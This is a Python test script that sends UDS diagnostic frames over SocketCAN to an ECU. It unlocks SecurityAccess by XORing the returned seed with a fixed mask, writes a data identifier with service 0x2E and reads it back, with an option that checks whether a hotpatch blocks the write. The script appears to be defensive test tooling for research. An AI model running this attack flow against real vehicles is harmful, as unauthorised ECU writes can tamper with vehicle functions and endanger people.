#!/usr/bin/env python3
"""Run a literature/tooling-aligned UDS SecurityAccess -> 0x2E write test.

This script models the common diagnostic-security failure mode where a routed
tester can reach an ECU, recover or know the SecurityAccess seed/key transform,
unlock service 0x27, and then perform WriteDataByIdentifier (0x2E).

References for the experiment shape:
- Martin Thompson, "UDS Security Access for Constrained ECUs", SAE Technical
  Paper 2022-01-0132, 2022, doi:10.4271/2022-01-0132.
- ISO 14229 / UDS service flow: 0x10, 0x27, 0x2E, 0x22.
- udsoncan service documentation for SecurityAccess and WriteDataByIdentifier.
- Caring Caribou's UDS modules for seed collection/randomness testing and DID
  dumping as open-source diagnostic-security tooling.
"""

from __future__ import annotations

import argparse
import csv
import socket
import struct
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable


CAN_EFF_FLAG = 0x80000000
CAN_RTR_FLAG = 0x40000000
CAN_ERR_FLAG = 0x20000000
CAN_SFF_MASK = 0x000007FF

DEFAULT_REQUEST_ID = 0x7E0
DEFAULT_RESPONSE_ID = 0x7E8
UDS_SEED_MASK = 0xA55A


@dataclass(frozen=True)
class AttackStep:
    name: str
    request_payload: bytes
    response_payload: bytes | None
    expected: str
    passed: bool
    note: str


Expectation = Callable[[bytes | None], tuple[bool, str]]


def pack_can_frame(arbitration_id: int, data: bytes) -> bytes:
    if len(data) > 8:
        raise ValueError("classic CAN data must be <= 8 bytes")
    padded = data + bytes(8 - len(data))
    return struct.pack("=IB3x8s", arbitration_id, len(data), padded)


def unpack_can_frame(raw: bytes) -> tuple[int, bytes]:
    can_id, dlc, data = struct.unpack("=IB3x8s", raw)
    arbitration_id = can_id & CAN_SFF_MASK
    if can_id & (CAN_EFF_FLAG | CAN_RTR_FLAG | CAN_ERR_FLAG):
        arbitration_id = can_id
    return arbitration_id, data[:dlc]


def pack_single_frame_payload(payload: bytes) -> bytes:
    if len(payload) > 7:
        raise ValueError("single-frame UDS payload must be <= 7 bytes")
    data = bytes([len(payload)]) + payload
    return data + bytes(8 - len(data))


def unpack_single_frame_payload(data: bytes) -> bytes | None:
    if not data:
        return None
    payload_length = data[0] & 0x0F
    if (data[0] >> 4) != 0 or len(data) < 1 + payload_length:
        return None
    return data[1 : 1 + payload_length]


def hex_bytes(data: bytes | None) -> str:
    if data is None:
        return "<none>"
    return data.hex().upper()


def expect_payload(expected: bytes) -> Expectation:
    def check(payload: bytes | None) -> tuple[bool, str]:
        if payload == expected:
            return True, f"matched {hex_bytes(expected)}"
        return False, f"expected {hex_bytes(expected)}, got {hex_bytes(payload)}"

    return check


def expect_seed(payload: bytes | None) -> tuple[bool, str]:
    if payload is None:
        return False, "no response"
    if len(payload) != 4 or payload[0] != 0x67 or payload[1] != 0x01:
        return False, f"expected 6701xxxx, got {hex_bytes(payload)}"
    return True, f"seed=0x{parse_seed(payload):04X}"


def parse_seed(payload: bytes | None) -> int:
    if payload is None or len(payload) != 4 or payload[0] != 0x67 or payload[1] != 0x01:
        raise RuntimeError(f"cannot parse seed from {hex_bytes(payload)}")
    return (payload[2] << 8) | payload[3]


def send_uds(
    can_socket: socket.socket,
    request_id: int,
    response_id: int,
    payload: bytes,
    timeout_s: float,
) -> bytes | None:
    can_socket.send(pack_can_frame(request_id, pack_single_frame_payload(payload)))
    deadline = time.monotonic() + timeout_s
    while time.monotonic() < deadline:
        can_socket.settimeout(max(0.01, deadline - time.monotonic()))
        try:
            raw = can_socket.recv(16)
        except socket.timeout:
            return None
        arbitration_id, data = unpack_can_frame(raw)
        if arbitration_id != response_id:
            continue
        return unpack_single_frame_payload(data)
    return None


def run_step(
    can_socket: socket.socket,
    args: argparse.Namespace,
    name: str,
    request_payload: bytes,
    expected_label: str,
    expectation: Expectation,
) -> AttackStep:
    response_payload = send_uds(
        can_socket,
        args.request_id,
        args.response_id,
        request_payload,
        args.timeout,
    )
    passed, note = expectation(response_payload)
    return AttackStep(
        name=name,
        request_payload=request_payload,
        response_payload=response_payload,
        expected=expected_label,
        passed=passed,
        note=note,
    )


def write_csv(path: Path, steps: list[AttackStep]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.writer(handle)
        writer.writerow(["step", "request_payload", "response_payload", "expected", "passed", "note"])
        for step in steps:
            writer.writerow(
                [
                    step.name,
                    hex_bytes(step.request_payload),
                    hex_bytes(step.response_payload),
                    step.expected,
                    "true" if step.passed else "false",
                    step.note,
                ]
            )


def print_step(step: AttackStep) -> None:
    status = "PASS" if step.passed else "FAIL"
    print(
        f"{status:4} {step.name:36} "
        f"req={hex_bytes(step.request_payload):14} "
        f"resp={hex_bytes(step.response_payload):14} "
        f"{step.note}"
    )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Run UDS SecurityAccess-derived 0x2E write attack test over SocketCAN."
    )
    parser.add_argument("--interface", default="can0", help="SocketCAN interface name")
    parser.add_argument("--request-id", default=DEFAULT_REQUEST_ID, type=lambda value: int(value, 0))
    parser.add_argument("--response-id", default=DEFAULT_RESPONSE_ID, type=lambda value: int(value, 0))
    parser.add_argument("--timeout", default=1.0, type=float)
    parser.add_argument(
        "--expect",
        choices=("success", "hotpatched-block"),
        default="success",
        help=(
            "Expected outcome for the final 0x2E. success proves the weak "
            "SecurityAccess attack; hotpatched-block expects ECU-local DID quarantine."
        ),
    )
    parser.add_argument(
        "--csv",
        default="software level/charts/uds_2e_security_access_attack_latest.csv",
        help="CSV output path",
    )
    return parser


def main() -> int:
    args = build_parser().parse_args()
    steps: list[AttackStep] = []

    with socket.socket(socket.PF_CAN, socket.SOCK_RAW, socket.CAN_RAW) as can_socket:
        try:
            can_socket.bind((args.interface,))
        except OSError as exc:
            print(f"cannot bind {args.interface}: {exc}", file=sys.stderr)
            return 2

        steps.append(
            run_step(
                can_socket,
                args,
                "enter_extended_session",
                bytes([0x10, 0x03]),
                "500300321388",
                expect_payload(bytes([0x50, 0x03, 0x00, 0x32, 0x13, 0x88])),
            )
        )
        seed_step = run_step(
            can_socket,
            args,
            "request_security_seed",
            bytes([0x27, 0x01]),
            "6701xxxx",
            expect_seed,
        )
        steps.append(seed_step)

        try:
            seed = parse_seed(seed_step.response_payload)
            key = seed ^ UDS_SEED_MASK
            key_payload = bytes([0x27, 0x02, (key >> 8) & 0xFF, key & 0xFF])
        except RuntimeError:
            key_payload = bytes([0x27, 0x02, 0x00, 0x00])

        steps.append(
            run_step(
                can_socket,
                args,
                "send_key_from_weak_transform",
                key_payload,
                "6702",
                expect_payload(bytes([0x67, 0x02])),
            )
        )
        steps.append(
            run_step(
                can_socket,
                args,
                "write_did_after_security_access",
                bytes([0x2E, 0x12, 0x34, 0xCA, 0xFE]),
                "7F2E31" if args.expect == "hotpatched-block" else "6E1234",
                expect_payload(bytes([0x7F, 0x2E, 0x31]))
                if args.expect == "hotpatched-block"
                else expect_payload(bytes([0x6E, 0x12, 0x34])),
            )
        )
        if args.expect == "hotpatched-block":
            steps.append(
                run_step(
                    can_socket,
                    args,
                    "read_back_quarantined_did",
                    bytes([0x22, 0x12, 0x34]),
                    "621234",
                    expect_payload(bytes([0x62, 0x12, 0x34])),
                )
            )
        else:
            steps.append(
                run_step(
                    can_socket,
                    args,
                    "read_back_written_did",
                    bytes([0x22, 0x12, 0x34]),
                    "621234CAFE",
                    expect_payload(bytes([0x62, 0x12, 0x34, 0xCA, 0xFE])),
                )
            )

    for step in steps:
        print_step(step)

    csv_path = Path(args.csv)
    write_csv(csv_path, steps)
    print(f"\nwrote {csv_path}")
    return 0 if all(step.passed for step in steps) else 1


if __name__ == "__main__":
    raise SystemExit(main())
